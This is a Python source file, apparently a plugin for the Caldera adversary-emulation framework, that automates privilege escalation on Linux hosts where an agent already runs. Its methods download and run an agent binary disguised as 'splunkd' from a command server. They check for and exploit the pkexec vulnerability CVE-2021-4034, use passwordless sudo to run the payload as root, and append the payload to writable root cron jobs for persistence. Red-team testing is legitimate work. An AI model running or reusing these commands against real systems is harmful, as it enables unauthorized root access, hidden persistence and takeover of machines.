import uuid
import asyncio
import base64
from aiohttp import web


from app.objects.secondclass.c_fact import Fact
from app.objects.secondclass.c_executor import Executor
from app.objects.secondclass.c_link import Link
from app.objects.c_ability import Ability
from app.service.auth_svc import for_all_public_methods, check_authorization


@for_all_public_methods(check_authorization)
class LavasploitAPI:

    def __init__(self, services):
        self.services = services
        self.auth_svc = self.services.get('auth_svc')
        self.data_svc = self.services.get('data_svc')
        self.rest_svc = self.services.get('rest_svc')
        self.current_command_index = -1
        self.current_command_name = 'Manual Command'
        self.current_command_description = 'Auto-generated'
        self.attempt_count = 3

    async def retrieve_status(self, request):
        return web.json_response(dict(
            pe_status=self.current_command_index,
            attempt_count = self.attempt_count
        ))

    async def validate_exploitation(self):
        command = 'whoami'
        result = await self.send_command_and_retrieve_result(command)
        print(str(base64.b64decode(result), 'utf-8').strip("\n\r"))

    async def generate_agent_payload(self):
        self.current_command_index = 0
        self.current_command_name = 'Generate Agent Payload'
        self.current_command_description = 'Generate executable agent payload for further use'
        command = '''
        echo 'server="#{server}";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v' > caldera_payload && chmod +x caldera_payload
        '''
        result = await self.send_command_and_retrieve_result(command)


    async def attempt_cve_2021_4034(self):
        self.current_command_name = 'Reconn for CVE-2021-4034'
        self.current_command_description = 'Reconn for CVE-2021-4034'
        command = '''
        if [ `command -v pkexec` ] && stat -c '%a' $(which pkexec) | grep -q 4755 && [ "$(stat -c '%Y' $(which pkexec))" -lt "1642035600" ]; then echo "True"; else echo "False"; fi
        '''
        is_vulnerable = await self.send_command_and_retrieve_result(command)
        #is_vulnerable = str(base64.b64decode(result), 'utf-8').strip("\n\r")
        if is_vulnerable == "True":
            self.current_command_name = 'Exploit CVE-2021-4034'
            self.current_command_description = 'Exploit CVE-2021-4034 with prepared payload'
            command = '''
            curl -X POST -H "file:CVE-2021-4034.zip" #{server}/file/download > CVE-2021-4034.zip && unzip ./CVE-2021-4034.zip && cd ./CVE-2021-4034 && make && ./cve-2021-4034 < #{location}/caldera_payload &
            '''
            result = await self.send_command_and_retrieve_result(command)



    async def attempt_Sudo(self):
        self.current_command_name = 'Reconn for sudo privileges'
        self.current_command_description = 'Reconn for available sudo privileges for current user without password'
        command = '''timeout 1 sudo -l | grep NOPASSWD | awk -F " " '{print $5}' '''
        current_user_privilege = await self.send_command_and_retrieve_result(command)
        #current_user_privilege = str(base64.b64decode(result), 'utf-8').strip("\n\r")
        if current_user_privilege == 'ALL':
            self.current_command_name = 'Execute payload as Root'
            self.current_command_description = 'Utilize the sudo privilege to execute payload as root'
            command = '''sudo /bin/bash ''' + self.current_path + '''/caldera_payload'''
            result = await self.send_command_and_retrieve_result(command)

    async def attempt_crontab(self):
        self.current_command_name = 'Reconn for Available Crontab'
        self.current_command_description = 'Reconn for available crontab jobs with root privilege and other-write access'
        reconn_command = '''
        file=$(cat /etc/crontab | grep root | grep -v "cron" | awk -F " " '{print $7}'); for f in $file; do find $f -perm -o=w 2>/dev/null; done
        '''
        writable_file = (await self.send_command_and_retrieve_result(reconn_command)).split()
        #writable_file = str(base64.b64decode(result), 'utf-8').strip("\n\r").split()
        for file in writable_file:
            self.current_command_name = 'Insert Payload into crontab jobs'
            self.current_command_description = 'insert out agent payload into listed writable file with file lock'
            command = '''echo "flock -xn ''' + self.current_path + '''/agent.lock -c '/bin/bash'''
            command = command + " " + self.current_path + '''/caldera_payload'" >> ''' + file
            result = await self.send_command_and_retrieve_result(command)



    async def run_auto_priv_esc(self, request):
        await self.update_target_info(request)

        #await self.generate_agent_payload()
        #await self.attempt_cve_2021_4034()

        #await self.attempt_crontab()
        await self.attempt_Sudo()

        return web.json_response('auto PE completed')

    async def update_target_info(self, request):
        data = await request.json()
        self.paw = data['paw']
        self.executor = data['executor']
        self.facts = data['facts']
        self.obfuscator = data['obfuscator']

        self.current_agent = (await self.data_svc.locate('agents', dict(paw=self.paw)))[0]
        self.current_path = self.current_agent.location.strip(self.current_agent.exe_name)


        access = dict(access=tuple(await self.auth_svc.get_permissions(request)))

        self.payload_template = {
            'paw': self.paw,
            'executor': self.executor,
            'facts': self.facts,
            'obfuscator': self.obfuscator,
            'internal_identifier': True,
            'access': access
        }


    async def send_command_and_retrieve_result(self, command_to_execute, source_payload=None):

        payload = {}
        payload.update(self.payload_template)
        payload['command'] = command_to_execute

        if source_payload is not None:
            payload['payload'] = source_payload

        await self.exploit(payload)

        link_identifier = self.link_retriver[0]
        await asyncio.sleep(10)
        timeout_count = 25
        while timeout_count:
            if link_identifier.is_finished():
                result = (await self.rest_svc.display_result(dict(link_id=link_identifier.id)))['output']
                break
            else:
                await asyncio.sleep(10)
                timeout_count -= 1
                result = 'Fetch Result Failed'
        return str(base64.b64decode(result), 'utf-8').strip("\n\r")

    async def exploit(self, request):
        if 'internal_identifier' in request:
            data = request
            access = data['access']
        else:
            data = await request.json()
            access = dict(access=tuple(await self.auth_svc.get_permissions(request)))
        converted_facts = [Fact(trait=f['trait'], value=f['value']) for f in data.get('facts', [])]
        temp_ability = await self.add_manual_command(data, access)
        await self.task_agent_with_manual_command(data['paw'], temp_ability, data['obfuscator'], converted_facts)
        return web.json_response('complete')

    async def task_agent_with_manual_command(self, paw, temp_ability, obfuscator, facts=()):
        new_links = []
        temp_ability_to_task = []
        temp_ability_to_task.append(temp_ability)
        for agent in await self.data_svc.locate('agents', dict(paw=paw)):
            self.rest_svc.log.debug('Tasking %s with %s' % (paw, getattr(temp_ability,'ability_id')))
            links = await agent.task(
                abilities=temp_ability_to_task,
                obfuscator=obfuscator,
                facts=facts
            )
            new_links.extend(links)
        self.link_retriver = links
        return new_links

    async def add_manual_command(self, data, access):
        for parameter in ['executor', 'command']:
            if parameter not in data.keys():
                return dict(error='Missing parameter: %s' % parameter)


        #Extract Access.Red from the access dict which contains Access.APP. Thus, we assume access['access'][0] = Access.Red
        agent_search = {'access': access['access'][0], 'paw': data['paw']}
        agent = (await self.data_svc.locate('agents', match=agent_search))[0]

        if not agent:
            return dict(error='Agent not found')

        if data['executor'] not in agent.executors:
            return dict(error='Agent missing specified executor')

        encoded_command = self.rest_svc.encode_string(data['command'])
        ability_id = str(uuid.uuid4())

        executor = Executor(name=data['executor'], platform=agent.platform, command=data['command'])
        ability = Ability(ability_id=ability_id, tactic='auto-generated', technique_id='auto-generated',
                          technique_name='auto-generated', name=self.current_command_name, description=self.current_command_description,
                          executors=[executor])
        link = Link.load(dict(command=encoded_command, paw=agent.paw, cleanup=0, ability=ability, score=0, jitter=2,
                              executor=executor))
        link.apply_id(agent.host)

        return ability



